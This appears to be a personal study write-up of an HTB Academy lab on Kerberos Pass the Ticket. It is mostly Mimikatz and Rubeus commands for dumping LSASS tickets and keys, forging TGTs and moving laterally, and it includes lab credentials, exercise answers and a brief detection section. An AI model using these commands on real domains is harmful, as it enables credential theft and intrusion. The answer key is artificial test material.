# Pass the Ticket (PtT) from Windows

## 🎯 Overview

**Pass the Ticket (PtT)** is a lateral movement technique in Active Directory environments that uses stolen **Kerberos tickets** instead of NTLM password hashes. Unlike Pass the Hash attacks, PtT leverages the Kerberos authentication protocol to impersonate users and access resources.

### Key Concepts
- **TGT (Ticket Granting Ticket)** - First ticket obtained, used to request additional service tickets
- **TGS (Ticket Granting Service)** - Service-specific tickets that allow access to particular resources
- **KDC (Key Distribution Center)** - Domain Controller component that issues tickets
- **LSASS Process** - Windows service that processes and stores Kerberos tickets

---

## 🔧 Kerberos Protocol Refresher

### Authentication Flow
```
1. User → KDC: Authentication Request (encrypted timestamp with password hash)
2. KDC → User: TGT (if authentication successful)
3. User → KDC: TGS Request (presents TGT)
4. KDC → User: TGS for specific service
5. User → Service: Present TGS for authentication
```

### Ticket Types
- **Service Ticket (TGS)** - Access to specific resource/service
- **Ticket Granting Ticket (TGT)** - Used to request service tickets for any accessible resource

**Advantage**: User doesn't need to provide password to every service - tickets handle authentication

---

## 🎯 Attack Prerequisites

### Required Conditions
- **Local Administrator** privileges (to access LSASS)
- **Valid Kerberos tickets** on target system
- **Domain-joined** Windows machine
- **LSASS access** for ticket extraction

### Ticket Sources
1. **Currently logged-in users** (active sessions)
2. **Cached tickets** from previous authentications  
3. **Forged tickets** using extracted keys
4. **Exported .kirbi files** from previous operations

---

## 🛠️ Harvesting Kerberos Tickets

### 1. Mimikatz Ticket Export

#### Export All Tickets to .kirbi Files
```cmd
# Launch Mimikatz with debug privileges
mimikatz.exe
privilege::debug

# Export all tickets to current directory
sekurlsa::tickets /export

# Results in .kirbi files like:
# [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
# [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi
```

#### Ticket Naming Convention
```bash
# User tickets
[randomvalue]-username@service-domain.local.kirbi

# Computer account tickets (end with $)
[randomvalue]-computername$@service-domain.local.kirbi

# TGT tickets (krbtgt service)
[randomvalue]-username@krbtgt-domain.local.kirbi
```

### 2. Rubeus Ticket Export

#### Dump All Tickets (Base64 Format)
```cmd
# Export all tickets as Base64 (easier copy-paste)
Rubeus.exe dump /nowrap

# Output includes:
ServiceName          :  krbtgt/inlanefreight.htb
UserName             :  plaintext
Base64EncodedTicket  :  doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA...
```

**Note**: Rubeus exports tickets in Base64 format instead of files, preventing disk artifacts.

### 3. Extract Kerberos Encryption Keys

#### Mimikatz Key Extraction
```cmd
mimikatz.exe
privilege::debug

# Extract all Kerberos encryption keys
sekurlsa::ekeys

# Results show multiple key types:
aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
```

**Key Types Explained:**
- **aes256_hmac** - Modern AES-256 encryption (preferred)
- **rc4_hmac_nt** - Legacy RC4/NTLM hash
- **rc4_hmac_old** - Older RC4 implementation

---

## 🔄 Pass the Key (OverPass the Hash)

### Concept
**Pass the Key** (aka OverPass the Hash) converts a user's hash/key into a full **Ticket Granting Ticket (TGT)**. This technique bridges hash-based and ticket-based attacks.

### 1. Mimikatz OverPass the Hash

#### Using NTLM Hash
```cmd
mimikatz.exe
privilege::debug

# Create new process with injected TGT
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

# Results:
# - New cmd.exe window opens
# - TGT injected into new process
# - Can request any service tickets for user
```

#### Process Details
```cmd
user    : plaintext
domain  : inlanefreight.htb  
program : cmd.exe
NTLM    : 3f74aa8f08f712f09cd5177b5c1ce50f
PID     : 1128
LUID    : 0 ; 3414364 (00000000:0034195c)
```

### 2. Rubeus OverPass the Hash

#### Using AES256 Key (Preferred)
```cmd
# Request TGT using AES256 key
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

# Using RC4/NTLM hash
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /nowrap
```

#### Key Advantages
- **No admin privileges required** (unlike Mimikatz)
- **Base64 output** for easy manipulation
- **Multiple encryption types** supported
- **Stealth operation** - no new processes

**Security Note**: Using RC4 instead of AES256 may trigger "encryption downgrade" detection in modern domains.

---

## 🎫 Pass the Ticket (PtT) Attacks

### 1. Rubeus Pass the Ticket

#### Direct Ticket Import with /ptt
```cmd
# Request TGT and immediately import to current session
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt

# Result: "Ticket successfully imported!"
```

#### Import .kirbi File
```cmd
# Import ticket from file
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

# Verify access
dir \\DC01.inlanefreight.htb\c$
```

#### Import Base64 Ticket
```cmd
# Convert .kirbi to Base64 (PowerShell)
[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))

# Import Base64 ticket
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA...
```

### 2. Mimikatz Pass the Ticket

#### Import .kirbi File
```cmd
mimikatz.exe
privilege::debug

# Import ticket into current session
kerberos::ptt "C:\path\to\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

# Result: * File: 'ticket.kirbi': OK

# Test access
dir \\DC01.inlanefreight.htb\c$
```

#### Launch New CMD with Ticket
```cmd
# Import ticket and launch new command prompt
kerberos::ptt "ticket.kirbi"
misc::cmd

# New cmd.exe window opens with imported ticket
```

---

## 🔌 PowerShell Remoting with PtT

### Prerequisites
- **Remote Management Users** group membership OR
- **Administrative privileges** on target OR  
- **Explicit PowerShell Remoting permissions**

**Default Ports:**
- **TCP/5985** - HTTP
- **TCP/5986** - HTTPS

### 1. Mimikatz + PowerShell Remoting

#### Method 1: Sequential Import
```cmd
# Step 1: Import ticket with Mimikatz
mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit

# Step 2: Launch PowerShell and connect
powershell
Enter-PSSession -ComputerName DC01

# Result: Remote session as imported user
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
```

### 2. Rubeus + Sacrificial Process

#### Create LOGON_TYPE 9 Process
```cmd
# Create sacrificial process (prevents TGT erasure)
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

# Results:
[+] Process         : 'cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 1556
[+] LUID            : 0xe07648
```

#### Request TGT in New Process
```cmd
# From new cmd window, request and import TGT
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt

# Launch PowerShell and connect
powershell
Enter-PSSession -ComputerName DC01

[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
```

---

## 🎯 HTB Academy Lab Exercises

### Lab Environment
- **Target**: 10.129.164.157 (ACADEMY-PWATTACKS-LM-MS01)
- **Credentials**: Administrator : AnotherC0mpl3xP4$$
- **Domain**: inlanefreight.htb
- **DC**: DC01.inlanefreight.htb

### Exercise 1: Ticket Collection
**Question**: "Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?"

```cmd
# RDP to target machine  
xfreerdp /v:10.129.164.157 /u:Administrator /p:'AnotherC0mpl3xP4$$'

# One-line Mimikatz export command
C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit

# List all .kirbi files
dir

# Expected .kirbi files (example):
[0;3e4]-2-0-60a10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi    (computer account)
[0;3e4]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi    (computer account)
[0;45828]-2-0-40e10000-julio@krbtgt-INLANEFREIGHT.HTB.kirbi  (USER TGT)
[0;461ec]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi   (USER TGT)
[0;46eb9]-2-0-40e10000-david@krbtgt-INLANEFREIGHT.HTB.kirbi  (USER TGT)

# Count only USER TGTs (exclude computer accounts ending with $)
```

**Answer**: **3** user TGTs (julio, john, david)

### Exercise 2: John's Share Access
**Question**: "Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \\DC01.inlanefreight.htb\john"

```cmd
# Import john's TGT with Mimikatz
C:\tools\mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\Administrator\[0;461ec]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit

# Access john's shared folder
dir \\DC01.inlanefreight.htb\john

# Read the flag
type \\DC01.inlanefreight.htb\john\john.txt
```

**Expected Output**:
```cmd
Directory of \\DC01.inlanefreight.htb\john
07/14/2022  07:25 AM    <DIR>          .
07/14/2022  07:25 AM    <DIR>          ..
07/14/2022  03:54 PM                30 john.txt
               1 File(s)             30 bytes
```

### Exercise 3: PowerShell Remoting
**Question**: "Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt"

```cmd
# Navigate to tools directory
cd C:\tools

# Import john's TGT with Mimikatz
mimikatz.exe
kerberos::ptt C:\tools\[0;461ec]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
exit

# Launch PowerShell from same Command Prompt
powershell

# Connect via PowerShell Remoting
Enter-PSSession -ComputerName DC01

# Read flag file
cat C:\john\john.txt
```

**Expected Session**:
```powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> cat C:\john\john.txt
[FLAG_CONTENT]
```

### Key Lab Insights

#### Ticket Identification Patterns
```bash
# Computer account tickets (ignore for user count)
*MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi

# User TGT tickets (count these)
*julio@krbtgt-INLANEFREIGHT.HTB.kirbi
*john@krbtgt-INLANEFREIGHT.HTB.kirbi  
*david@krbtgt-INLANEFREIGHT.HTB.kirbi
```

#### Critical Command Sequence
```cmd
1. Export: mimikatz "privilege::debug" "sekurlsa::tickets /export" exit
2. Import: kerberos::ptt "[ticket-path]"
3. Test: dir \\DC01.inlanefreight.htb\[username]
4. Remote: Enter-PSSession -ComputerName DC01
```

#### Success Indicators
- **Exercise 1**: Count = 3 (julio, john, david)
- **Exercise 2**: Successful SMB share access to john folder
- **Exercise 3**: Remote PowerShell session established as john

### Optional: Tool Comparison
**Objective**: Perform attacks using both Mimikatz and Rubeus independently

**Mimikatz-Only Approach:**
```cmd
# Export tickets
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# Import and test
mimikatz.exe "privilege::debug" "kerberos::ptt ticket.kirbi" "exit"
```

**Rubeus-Only Approach:**
```cmd
# Dump tickets
Rubeus.exe dump /nowrap

# Import and test  
Rubeus.exe ptt /ticket:base64_ticket_data
```

---

## 🛡️ Detection and Defense

### Detection Indicators
```bash
# Event Log Monitoring
# Event ID 4768 - TGT Request
# Event ID 4769 - TGS Request  
# Event ID 4624 - Logon with unusual characteristics

# Unusual ticket requests:
- RC4 encryption in AES-enabled domain
- Tickets requested outside normal hours
- Multiple TGT requests for same user
- Cross-domain ticket requests
```

### Defensive Measures
```bash
# Account Security
✅ Implement least privilege access
✅ Regular password rotation for service accounts
✅ Monitor privileged account usage

# Kerberos Hardening
✅ Enforce AES encryption only
✅ Reduce ticket lifetime
✅ Enable Kerberos logging
✅ Monitor for downgrade attacks

# Network Monitoring
✅ Monitor Kerberos traffic (port 88)
✅ Detect unusual authentication patterns
✅ Implement honeypot accounts
```

---

## 🔗 Related Techniques

### Comparison Matrix
| Technique | Auth Method | Requirements | Stealth Level |
|-----------|-------------|--------------|---------------|
| **Pass the Hash** | NTLM | Admin + Hash | Medium |
| **Pass the Ticket** | Kerberos | Valid Ticket | High |
| **Pass the Key** | Kerberos | Key/Hash | High |
| **Golden Ticket** | Kerberos | krbtgt Hash | Very High |
| **Silver Ticket** | Kerberos | Service Hash | Very High |

### Lateral Movement Chain
```bash
1. Initial Access → Credential Dumping
2. Extract NTLM Hash → Pass the Hash
3. Extract Kerberos Keys → Pass the Key  
4. Generate TGT → Pass the Ticket
5. Access Target Resources → Further Exploitation
```

---

## 📚 References

- **HTB Academy**: Password Attacks Module - Pass the Ticket
- **Mimikatz Documentation**: Kerberos attacks and ticket manipulation
- **Rubeus Documentation**: .NET tool for Kerberos abuse
- **Microsoft**: Kerberos Authentication Technical Reference
- **NIST**: Guidelines for Kerberos implementations 